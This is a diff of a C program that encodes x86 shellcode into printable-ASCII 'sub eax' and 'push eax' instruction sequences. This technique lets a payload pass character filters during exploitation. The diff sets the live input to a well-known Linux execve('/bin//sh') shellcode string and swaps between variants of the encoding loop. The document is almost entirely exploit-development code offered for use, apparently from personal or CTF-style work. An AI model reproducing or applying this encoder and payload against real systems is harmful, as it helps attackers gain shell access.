@@ -153,13 +153,57 @@ unsigned char * build(char * shellcode, char left, char right){
 	char * pointer = malloc(length_malloc);
 	memset(pointer, 0x90, length_malloc);
 	int i = 0;
+	/*
+	// shellcode : 
+	// 11 22 33 44 55 66 77
+	//   \  \  \  \  \  \  \
+	// 90 11 22 33 44 55 66 77
+*/
+	// strcpy
+	for (i = 0; i < length_shellcode; i++){
+		pointer[i] = shellcode[i];
+	}
+
+	// target pointer to the last integer
+	int *target = ((int *)pointer) + ((length_malloc) / 4 - 1);
+
+	for (i = 0; i < (length_malloc / 4); i++){
+		struct RESULT * result = search(0x100000000 - *target, left, right);
+		printComment(*target);
+		setZero();
+		printf("sub eax, %xH\nsub eax, %xH\nsub eax, %xH\n", result->result_a, result->result_b, result->result_c);
+		printf("push eax\n");
+		free(result);
+	
+		target--;
+			
+	}
+	
+	/*
+	for(i = 0; i < length_shellcode; i++){
+		pointer[length_malloc - 1 - i] = shellcode[length_shellcode - 1 - i];
+	}
+
+	int * target = (int *)pointer;
+	for (i = 0; i < (length_malloc / 4); i++){
+		struct RESULT * result = search(0x100000000 - *target, left, right);
+		printComment(*target);
+		setZero();
+		printf("sub eax, %xH\nsub eax, %xH\nsub eax, %xH\n", result->result_a, result->result_b, result->result_c);
+		printf("push eax\n");
+		free(result);
+	
+			target++;
+	}
+	*/
+	/*
+
 	for(i = 0; i < length_shellcode; i++){
 		pointer[i] = shellcode[length_shellcode - i - 1];	
 	}
 	int *target = (int *)pointer;
 	for (i = 0; i < (length_malloc / 4); i++){
-		// printf("target[%d] -> [%x]\n", i, *target);
-		/* 开始算 */
+	//	printf("target[%d] -> [%x]\n", i, *target);
 //		search(*target, 0x20, 0x7f);
 		struct RESULT * result = search(0x100000000 - *target, left, right);
 		printComment(*target);
@@ -167,15 +211,14 @@ unsigned char * build(char * shellcode, char left, char right){
 		printf("sub eax, %xH\nsub eax, %xH\nsub eax, %xH\n", result->result_a, result->result_b, result->result_c);
 		printf("push eax\n");
 		free(result);
-		/* 处理下四个字节 */
 		target++;
 	}
+	*/
 }
 
 
 int main(){
-	// char *shellcode = "\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\x99\xcd\x80";
-	char *shellcode = "\xff\xff\xfc\xc4";
+	char *shellcode = "\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\x99\xcd\x80";
 	build(shellcode, 0x20, 0x7f); // 设置参数似乎并没用
 	return 0;
 }
